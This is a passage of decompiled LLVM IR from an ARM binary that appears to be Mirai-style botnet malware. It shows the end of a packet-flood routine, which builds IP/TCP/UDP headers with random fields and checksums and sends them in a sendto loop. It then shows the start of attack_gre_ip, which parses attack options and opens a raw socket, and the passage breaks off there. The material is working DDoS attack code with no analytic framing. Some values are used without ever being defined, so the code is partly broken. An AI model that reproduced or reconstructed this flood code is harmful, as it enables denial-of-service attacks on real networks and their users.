  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %dec_label_pc_8ff0, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_8dfc
  %v1_8e04 = load i32, i32* @r5, align 4
  %v2_8e04 = add i32 %v1_8e04, 16
  %v3_8e04 = inttoptr i32 %v2_8e04 to i32*
  %v4_8e04 = load i32, i32* %v3_8e04, align 4
  store i32 %v4_8e04, i32* %r3.global-to-local, align 4
  %v2_8e08 = load i32, i32* @r6, align 4
  %v3_8e08 = add i32 %v2_8e08, 16
  %v4_8e08 = inttoptr i32 %v3_8e08 to i32*
  store i32 %v4_8e04, i32* %v4_8e08, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8e10:                                ; preds = %bb88, %.thread11, %dec_label_pc_8ff0
  %v0_8e10 = call i32 @rand_next()
  store i32 %v0_8e10, i32* %r0.global-to-local, align 4
  store i32 %v0_8e10, i32* %stack_var_-48, align 4
  %v0_8e18 = call i32 @rand_next()
  store i32 %v0_8e18, i32* %r0.global-to-local, align 4
  store i32 %v0_8e18, i32* %stack_var_-52, align 4
  %v0_8e20 = call i32 @rand_next()
  store i32 %v2_8e24, i32* %r1.global-to-local, align 4
  store i32 %v0_8e20, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_8e30 = load i32, i32* @r7, align 4
  store i32 %v0_8e30, i32* %r0.global-to-local, align 4
  %v3_8e34 = call i32 @util_memcpy(i32 %v0_8e30, i32 %v2_8e24, i32 4)
  %v0_8e38 = load i32, i32* @r7, align 4
  %v1_8e38 = add i32 %v0_8e38, 6
  store i32 %v1_8e38, i32* %r0.global-to-local, align 4
  store i32 %v2_8e3c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_8e44 = call i32 @util_memcpy(i32 %v1_8e38, i32 %v2_8e3c, i32 4)
  %v0_8e48 = load i32, i32* @r7, align 4
  %v1_8e48 = add i32 %v0_8e48, 4
  store i32 %v1_8e48, i32* %r0.global-to-local, align 4
  store i32 %v2_8e4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e54 = call i32 @util_memcpy(i32 %v1_8e48, i32 %v2_8e4c, i32 2)
  store i32 %v2_8e58, i32* %r1.global-to-local, align 4
  %v0_8e5c = load i32, i32* @r7, align 4
  %v1_8e5c = add i32 %v0_8e5c, 10
  store i32 %v1_8e5c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e64 = call i32 @util_memcpy(i32 %v1_8e5c, i32 %v2_8e58, i32 2)
  store i32 %v3_8e64, i32* %r0.global-to-local, align 4
  store i32 %v1_8ab4, i32* %r1.global-to-local, align 4
  store i1 %v2_8e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e6c, label %dec_label_pc_8e74, label %dec_label_pc_8ffc

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8ffc
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_8e78 = load i32, i32* @r5, align 4
  %v3_8e78 = add i32 %v2_8e78, 10
  %v4_8e78 = inttoptr i32 %v3_8e78 to i16*
  store i16 0, i16* %v4_8e78, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e80 = load i32, i32* @r5, align 4
  store i32 %v0_8e80, i32* @r0, align 4
  %v2_8e84 = call i32 @checksum_generic(i32 %v0_8e80, i32 20)
  %v3_8e84 = trunc i32 %v2_8e84 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_8e8c = load i32, i32* @r5, align 4
  %v4_8e8c = add i32 %v3_8e8c, 10
  %v5_8e8c = inttoptr i32 %v4_8e8c to i16*
  store i16 %v3_8e84, i16* %v5_8e8c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e94 = load i32, i32* %r3.global-to-local, align 4
  %v1_8e94 = trunc i32 %v0_8e94 to i16
  %v2_8e94 = load i32, i32* @r6, align 4
  %v3_8e94 = add i32 %v2_8e94, 10
  %v4_8e94 = inttoptr i32 %v3_8e94 to i16*
  store i16 %v1_8e94, i16* %v4_8e94, align 2
  %v0_8e98 = load i32, i32* @r6, align 4
  store i32 %v0_8e98, i32* @r0, align 4
  %v2_8e9c = call i32 @checksum_generic(i32 %v0_8e98, i32 20)
  %v3_8e9c = trunc i32 %v2_8e9c to i16
  store i32 %v2_8e9c, i32* %r0.global-to-local, align 4
  %v3_8ea0 = load i32, i32* @r6, align 4
  %v4_8ea0 = add i32 %v3_8ea0, 10
  %v5_8ea0 = inttoptr i32 %v4_8ea0 to i16*
  store i16 %v3_8e9c, i16* %v5_8ea0, align 2
  store i32 0, i32* @r4, align 4
  %v0_8ea8 = load i32, i32* @r8, align 4
  store i32 %v0_8ea8, i32* @r1, align 4
  %v1_8eac = add i32 %v0_8ea8, 4
  %v2_8eac = inttoptr i32 %v1_8eac to i16*
  %v3_8eac = load i16, i16* %v2_8eac, align 2
  %v4_8eac = zext i16 %v3_8eac to i32
  store i32 %v4_8eac, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_8eb4 = add i32 %v0_8ea8, 6
  %v4_8eb4 = inttoptr i32 %v3_8eb4 to i16*
  store i16 0, i16* %v4_8eb4, align 2
  %v0_8eb8 = load i32, i32* @r6, align 4
  store i32 %v0_8eb8, i32* %r0.global-to-local, align 4
  %v4_8ebc = call i32 @checksum_tcpudp(i32 %v0_8eb8, i32 %v0_8ea8, i32 %v4_8eac, i32 %stack_var_-136.0.ph)
  %v5_8ebc = trunc i32 %v4_8ebc to i16
  store i32 %v4_8ebc, i32* %r0.global-to-local, align 4
  %v3_8ec0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8ec0, i32* %r2.global-to-local, align 4
  %v3_8ec4 = mul i32 %v3_8ec0, 32
  store i32 %v3_8ec4, i32* %r3.global-to-local, align 4
  %v0_8ec8 = load i32, i32* @r5, align 4
  %v1_8ec8 = add i32 %v0_8ec8, 16
  %v2_8ec8 = inttoptr i32 %v1_8ec8 to i32*
  %v3_8ec8 = load i32, i32* %v2_8ec8, align 4
  %v5_8ecc = mul i32 %v3_8ec0, 24
  store i32 %v5_8ecc, i32* %r3.global-to-local, align 4
  %v1_8ed0 = load i32, i32* @sb, align 4
  %v2_8ed0 = add i32 %v1_8ed0, %v5_8ecc
  store i32 %v2_8ed0, i32* @lr, align 4
  %v2_8ed4 = add i32 %v2_8ed0, 4
  %v3_8ed4 = inttoptr i32 %v2_8ed4 to i32*
  store i32 %v3_8ec8, i32* %v3_8ed4, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8edc = load i32, i32* @r8, align 4
  %v4_8edc = add i32 %v3_8edc, 6
  %v5_8edc = inttoptr i32 %v4_8edc to i16*
  store i16 %v5_8ebc, i16* %v5_8edc, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_8ee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8ee4 = trunc i32 %v0_8ee4 to i16
  %v2_8ee4 = load i32, i32* %r3.global-to-local, align 4
  %v3_8ee4 = load i32, i32* @sb, align 4
  %v4_8ee4 = add i32 %v3_8ee4, %v2_8ee4
  %v5_8ee4 = inttoptr i32 %v4_8ee4 to i16*
  store i16 %v1_8ee4, i16* %v5_8ee4, align 2
  %v0_8ee8 = load i32, i32* @r4, align 4
  %v1_8ee8 = trunc i32 %v0_8ee8 to i16
  %v2_8ee8 = load i32, i32* @lr, align 4
  %v3_8ee8 = add i32 %v2_8ee8, 2
  %v4_8ee8 = inttoptr i32 %v3_8ee8 to i16*
  store i16 %v1_8ee8, i16* %v4_8ee8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8ef0 = load i32, i32* @r5, align 4
  store i32 %v0_8ef0, i32* %r1.global-to-local, align 4
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_8efc = load i32, i32* @lr, align 4
  %v0_8f00 = load i32, i32* %ip.global-to-local, align 4
  %v6_8f04 = call i32 @__libc_sendto(i32 %v3_8afc, i32 %v0_8ef0, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_8efc, i32 %v0_8f00)
  %v3_8f08 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8f08, i32* %r3.global-to-local, align 4
  %v1_8f0c = add i32 %v3_8f08, 1
  store i32 %v1_8f0c, i32* %r0.global-to-local, align 4
  %v1_8f10 = load i32, i32* @sl, align 4
  %v9_8f10 = icmp eq i32 %v1_8f0c, %v1_8f10
  store i1 %v9_8f10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8f0c, i32* %stack_var_-44, align 4
  %v6_8f18 = icmp slt i32 %v1_8f0c, %v1_8f10
  br i1 %v6_8f18, label %dec_label_pc_8d9c, label %dec_label_pc_8d88

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8d9c
  %v1_8f20 = add i32 %v2_8da4, 16
  %v2_8f20 = inttoptr i32 %v1_8f20 to i32*
  %v3_8f20 = load i32, i32* %v2_8f20, align 4
  store i32 %v3_8f20, i32* %r4.global-to-local, align 4
  %v0_8f24 = call i32 @rand_next()
  store i32 %v0_8f24, i32* %r0.global-to-local, align 4
  %v3_8f28 = load i32, i32* %stack_var_-44, align 4
  %v5_8f30 = mul i32 %v3_8f28, 24
  %v0_8f34 = load i32, i32* %r4.global-to-local, align 4
  %v1_8f34 = and i32 %v0_8f34, 16711680
  store i32 %v1_8f34, i32* %ip.global-to-local, align 4
  %v3_8f38 = udiv i32 %v0_8f34, 16777216
  %v4_8f3c = udiv i32 %v1_8f34, 256
  %v5_8f3c = or i32 %v4_8f3c, %v3_8f38
  store i32 %v5_8f3c, i32* %r2.global-to-local, align 4
  %v1_8f40 = load i32, i32* @sb, align 4
  %v2_8f40 = add i32 %v1_8f40, %v5_8f30
  store i32 %v2_8f40, i32* %r1.global-to-local, align 4
  %v1_8f44 = and i32 %v0_8f34, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_8f44, i32* %r3.global-to-local, align 4
  %v1_8f48 = add i32 %v2_8f40, 20
  %v2_8f48 = inttoptr i32 %v1_8f48 to i8*
  %v3_8f48 = load i8, i8* %v2_8f48, align 1
  %v4_8f48 = zext i8 %v3_8f48 to i32
  store i32 %v4_8f48, i32* %ip.global-to-local, align 4
  %v4_8f4c = mul i32 %v1_8f44, 256
  %v4_8f50 = mul i32 %v0_8f34, 16777216
  %v5_8f4c = or i32 %v4_8f4c, %v4_8f50
  %v5_8f50 = or i32 %v5_8f4c, %v5_8f3c
  %v7_8f54 = lshr i32 %v0_8f24, %v4_8f48
  %v8_8f54 = add i32 %v7_8f54, %v5_8f50
  store i32 %v8_8f54, i32* %r2.global-to-local, align 4
  %v1_8f58 = and i32 %v8_8f54, 16711680
  store i32 %v1_8f58, i32* %r0.global-to-local, align 4
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  %v5_8f70 = call i32 @llvm.bswap.i32(i32 %v8_8f54)
  store i32 %v5_8f70, i32* %r3.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  %v1_8f78 = load i32, i32* @r5, align 4
  %v2_8f78 = add i32 %v1_8f78, 16
  %v3_8f78 = inttoptr i32 %v2_8f78 to i32*
  store i32 %v5_8f70, i32* %v3_8f78, align 4
  br i1 %v2_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  %v0_8f80 = call i32 @rand_next()
  store i32 %v0_8f80, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_8f8c = load i32, i32* @fp, align 4
  %v9_8f8c = icmp eq i32 %v0_8f8c, 65535
  store i1 %v9_8f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f90 = load i32, i32* @r5, align 4
  %v2_8f90 = add i32 %v1_8f90, 12
  %v3_8f90 = inttoptr i32 %v2_8f90 to i32*
  store i32 %v0_8f80, i32* %v3_8f90, align 4
  br i1 %v9_8f8c, label %dec_label_pc_8f98, label %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge

dec_label_pc_8f80.dec_label_pc_8de4_crit_edge:    ; preds = %dec_label_pc_8f80
  %v1_8de8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8de4

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f80, %dec_label_pc_8dd4
  %v0_8f98 = call i32 @rand_next()
  %v3_8fa0 = urem i32 %v0_8f98, 65536
  store i32 %v3_8fa0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v1_8fac = sub nsw i32 999, %v3_8fa0
  store i32 %v1_8fac, i32* %r3.global-to-local, align 4
  %v1_8fb0 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fb0 = icmp eq i32 %v3_8b48, %v1_8fb0
  store i1 %v9_8fb0, i1* %cpsr_z.global-to-local, align 1
  %v1_8fb4 = trunc i32 %v0_8f98 to i16
  %v2_8fb4 = load i32, i32* @r5, align 4
  %v3_8fb4 = add i32 %v2_8fb4, 4
  %v4_8fb4 = inttoptr i32 %v3_8fb4 to i16*
  store i16 %v1_8fb4, i16* %v4_8fb4, align 2
  %v0_8fb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_8fb8 = trunc i32 %v0_8fb8 to i16
  %v2_8fb8 = load i32, i32* @r6, align 4
  %v3_8fb8 = add i32 %v2_8fb8, 4
  %v4_8fb8 = inttoptr i32 %v3_8fb8 to i16*
  store i16 %v1_8fb8, i16* %v4_8fb8, align 2
  br i1 %v9_8fb0, label %dec_label_pc_8fc0, label %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge

dec_label_pc_8f98.dec_label_pc_8df0_crit_edge:    ; preds = %dec_label_pc_8f98
  %v1_8df4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8df0

dec_label_pc_8fc0:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_8de4
  %v0_8fc0 = call i32 @rand_next()
  %v1_8fc0 = trunc i32 %v0_8fc0 to i16
  store i32 %v0_8fc0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v1_8fc8 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fc8 = icmp eq i32 %v3_8b4c, %v1_8fc8
  store i1 %v9_8fc8, i1* %cpsr_z.global-to-local, align 1
  %v3_8fcc = load i32, i32* @r5, align 4
  %v4_8fcc = add i32 %v3_8fcc, 58
  %v5_8fcc = inttoptr i32 %v4_8fcc to i16*
  store i16 %v1_8fc0, i16* %v5_8fcc, align 2
  br i1 %v9_8fc8, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  %v0_8fd4 = call i32 @rand_next()
  %v1_8fd4 = trunc i32 %v0_8fd4 to i16
  store i32 %v0_8fd4, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* @r4, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_8fd4
  %v3_8fe432 = load i32, i32* @r8, align 4
  %v4_8fe433 = add i32 %v3_8fe432, 2
  %v5_8fe434 = inttoptr i32 %v4_8fe433 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe434, align 2
  br label %dec_label_pc_8ff0

bb88:                                             ; preds = %dec_label_pc_8fd4
  %v1_8fe0 = load i32, i32* @r5, align 4
  %v2_8fe0 = add i32 %v1_8fe0, 16
  %v3_8fe0 = inttoptr i32 %v2_8fe0 to i32*
  %v4_8fe0 = load i32, i32* %v3_8fe0, align 4
  store i32 %v4_8fe0, i32* %r3.global-to-local, align 4
  %v3_8fe4 = load i32, i32* @r8, align 4
  %v4_8fe4 = add i32 %v3_8fe4, 2
  %v5_8fe4 = inttoptr i32 %v4_8fe4 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe4, align 2
  %v1_8fe8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fe8 = load i32, i32* @r6, align 4
  %v3_8fe8 = add i32 %v2_8fe8, 16
  %v4_8fe8 = inttoptr i32 %v3_8fe8 to i32*
  store i32 %v1_8fe8, i32* %v4_8fe8, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ff0:                                ; preds = %.thread31, %dec_label_pc_8dfc
  %v0_8ff0 = call i32 @rand_next()
  store i32 %v0_8ff0, i32* %r0.global-to-local, align 4
  %v1_8ff4 = load i32, i32* @r6, align 4
  %v2_8ff4 = add i32 %v1_8ff4, 16
  %v3_8ff4 = inttoptr i32 %v2_8ff4 to i32*
  store i32 %v0_8ff0, i32* %v3_8ff4, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8e10
  %v0_8ffc = load i32, i32* @r8, align 4
  %v1_8ffc = add i32 %v0_8ffc, 8
  store i32 %v1_8ffc, i32* %r0.global-to-local, align 4
  store i32 %v6_8a94, i32* %r1.global-to-local, align 4
  %v2_9004 = inttoptr i32 %v1_8ffc to i16*
  %v3_9004 = call i32 @rand_str(i16* %v2_9004, i32 %v6_8a94)
  store i32 %v3_9004, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8e74

dec_label_pc_900c:                                ; preds = %dec_label_pc_8b0c
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v1_9010 = call i32 @__GI___libc_close(i32 %v3_8afc)
  store i32 %v1_9010, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9014

dec_label_pc_9014:                                ; preds = %entry, %dec_label_pc_900c
  %v1_901c = phi i32 [ %v3_8afc, %entry ], [ %v1_9010, %dec_label_pc_900c ]
  store i32 %v3_89ac, i32* %r4.global-to-local, align 4
  store i32 %v6_89ac, i32* %r5.global-to-local, align 4
  store i32 %v24_89ac, i32* %fp.global-to-local, align 4
  ret i32 %v1_901c

dec_label_pc_9020:                                ; preds = %dec_label_pc_8b34
  %v1_9028 = add i32 %v6_8a94, 8
  store i32 %v1_9028, i32* %r1.global-to-local, align 4
  %v1_902c = add i32 %v6_8a94, 66
  store i32 %v1_902c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_8d88.preheader

; uselistorder directives
  uselistorder i32 %v1_902c, { 1, 0 }
  uselistorder i32 %v1_9028, { 1, 0 }
  uselistorder i16 %v1_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fc0, { 1, 0 }
  uselistorder i32 %v3_8fa0, { 1, 0 }
  uselistorder i32 %v0_8f98, { 1, 0 }
  uselistorder i32 %v5_8f70, { 1, 0 }
  uselistorder i32 %v0_8f34, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8f10, { 1, 2, 0 }
  uselistorder i32 %v1_8f0c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_8ec0, { 1, 0, 2 }
  uselistorder i32 %v4_8ebc, { 1, 0 }
  uselistorder i32 %v0_8ea8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8e9c, { 1, 0 }
  uselistorder i32 %v7_8db0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_8dcc, { 2, 1, 0 }
  uselistorder i1 %v2_8fdc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8d20, { 1, 0, 2 }
  uselistorder i32 %v3_8b9c, { 1, 0 }
  uselistorder i32 %v3_8b80, { 1, 2, 0 }
  uselistorder i32 %v1_8b7c, { 1, 0 }
  uselistorder i32 %v1_8b40, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8b3c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8b38, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8b34, { 1, 0, 2, 3 }
  uselistorder i1 %v7_8b2c, { 1, 0 }
  uselistorder i1 %v7_8b00, { 1, 0 }
  uselistorder i32 %v3_8afc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_8ae8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_8ab4, { 1, 2, 3, 0 }
  uselistorder i32 %v6_8a94, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8a48, { 1, 2, 0 }
  uselistorder i32 %v1_8a24, { 3, 2, 1, 0 }
  uselistorder i32 %v6_8a1c, { 1, 0 }
  uselistorder i32 %v6_89e0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_89c8, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 27, 26, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 21, 22, 24, 23, 27, 25, 26, 30, 28, 29, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9014, { 1, 0 }
  uselistorder label %dec_label_pc_8e74, { 1, 0 }
  uselistorder label %dec_label_pc_8e10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8d88.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9040 = load i32, i32* @r4, align 4
  %v6_9040 = load i32, i32* @r5, align 4
  %v24_9040 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_905c = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9060 = load i32, i32* @r5, align 4
  store i32 %v0_9060, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9070 = load i32, i32* @r4, align 4
  %v5_9074 = inttoptr i32 %v0_9060 to i32*
  %v6_9074 = call i32 @attack_get_opt_int(i32 %v0_9070, i32* %v5_9074, i32 2, i32 0, i32 %v2_905c)
  %v1_9080 = urem i32 %v6_9074, 256
  store i32 %v1_9080, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_908c = load i32, i32* @r5, align 4
  store i32 %v0_908c, i32* %r1.global-to-local, align 4
  %v0_9090 = load i32, i32* @r4, align 4
  %v5_9094 = trunc i32 %v6_9074 to i8
  %v6_9098 = inttoptr i32 %v0_908c to i32*
  %v7_9098 = call i32 @attack_get_opt_int(i32 %v0_9090, i32* %v6_9098, i32 3, i32 65535, i32 %v6_9074)
  %v0_909c = load i32, i32* @r5, align 4
  store i32 %v0_909c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9098, i32* %fp.global-to-local, align 4
  %v0_90ac = load i32, i32* @r4, align 4
  %v5_90b0 = inttoptr i32 %v0_909c to i32*
  %v6_90b0 = call i32 @attack_get_opt_int(i32 %v0_90ac, i32* %v5_90b0, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_90b8 = urem i32 %v6_90b0, 256
  store i32 %v1_90b8, i32* %ip.global-to-local, align 4
  %v0_90bc = load i32, i32* @r5, align 4
  store i32 %v0_90bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_90c8 = load i32, i32* @r4, align 4
  %v6_90d0 = inttoptr i32 %v0_90bc to i32*
  %v7_90d0 = call i32 @attack_get_opt_int(i32 %v0_90c8, i32* %v6_90d0, i32 5, i32 1, i32 %v1_90b8)
  %v1_90dc = urem i32 %v7_90d0, 256
  store i32 %v1_90dc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_90e8 = load i32, i32* @r5, align 4
  store i32 %v0_90e8, i32* %r1.global-to-local, align 4
  %v0_90ec = load i32, i32* @r4, align 4
  %v5_90f4 = inttoptr i32 %v0_90e8 to i32*
  %v6_90f4 = call i32 @attack_get_opt_int(i32 %v0_90ec, i32* %v5_90f4, i32 6, i32 65535, i32 %v1_90dc)
  %v0_90fc = load i32, i32* @r5, align 4
  store i32 %v0_90fc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_90f4, i32* @r8, align 4
  %v0_910c = load i32, i32* @r4, align 4
  %v5_9110 = inttoptr i32 %v0_90fc to i32*
  %v6_9110 = call i32 @attack_get_opt_int(i32 %v0_910c, i32* %v5_9110, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_9114 = load i32, i32* @r5, align 4
  store i32 %v0_9114, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_9110, i32* @r7, align 4
  %v0_9124 = load i32, i32* @r4, align 4
  %v5_9128 = inttoptr i32 %v0_9114 to i32*
  %v6_9128 = call i32 @attack_get_opt_int(i32 %v0_9124, i32* %v5_9128, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9138 = load i32, i32* @r5, align 4
  store i32 %v0_9138, i32* %r1.global-to-local, align 4
  %v0_913c = load i32, i32* @r4, align 4
  %v5_9140 = inttoptr i32 %v0_9138 to i32*
  %v6_9140 = call i32 @attack_get_opt_int(i32 %v0_913c, i32* %v5_9140, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9148 = urem i32 %v6_9140, 256
  store i32 %v1_9148, i32* %ip.global-to-local, align 4
  %v0_914c = load i32, i32* @r5, align 4
  store i32 %v0_914c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9158 = load i32, i32* @r4, align 4
  %v5_9160 = inttoptr i32 %v0_914c to i32*
  %v6_9160 = call i32 @attack_get_opt_int(i32 %v0_9158, i32* %v5_9160, i32 19, i32 0, i32 %v1_9148)
  %v0_9168 = load i32, i32* @r5, align 4
  store i32 %v0_9168, i32* %r1.global-to-local, align 4
  %v2_916c = load i32, i32* @global_var_24f40.59, align 4
  store i32 %v2_916c, i32* %r3.global-to-local, align 4
  store i32 %v6_9160, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9178 = load i32, i32* @r4, align 4
  %v5_917c = inttoptr i32 %v0_9168 to i32*
  %v6_917c = call i32 @attack_get_opt_int(i32 %v0_9178, i32* %v5_917c, i32 25, i32 %v2_916c, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9190 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_9194 = icmp eq i32 %v3_9190, -1
  store i1 %v7_9194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9194, label %dec_label_pc_9634, label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_91a8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_91a8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
